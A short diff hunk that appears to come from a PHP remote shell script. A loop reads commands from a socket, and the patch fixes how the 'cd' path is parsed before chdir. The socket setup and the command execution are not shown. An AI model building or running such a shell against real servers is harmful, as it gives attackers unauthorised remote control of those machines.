@@ -51,7 +51,7 @@ while (True) {
         $cmd = socket_read($sock,1024);
     }
     if (substr($cmd,0,3) == "cd " and strlen($cmd) > 3) {
-        $cwd = trim(substr($cmd,3,-1));
+        $cwd = trim(substr($cmd,3));
         chdir($cwd);
         $cwd = getcwd();
     }
